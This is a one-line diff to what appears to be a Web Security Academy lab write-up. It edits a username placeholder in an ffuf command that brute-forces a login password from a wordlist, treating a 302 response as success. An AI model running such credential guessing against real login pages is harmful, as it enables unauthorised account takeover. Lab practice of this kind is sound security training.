@@ -17,7 +17,7 @@ After finding a valid `username` use the below script to extract the password.
 ```bash
 ffuf -X POST \
     -u https://YOUR-LAB-ID.web-security-academy.net/login \
-    -d "username=your-found-username&password=FUZZ" \
+    -d "username=YOUR-FOUND-USERNAME&password=FUZZ" \
     -w passwords.txt \
     -mc 302
 ```
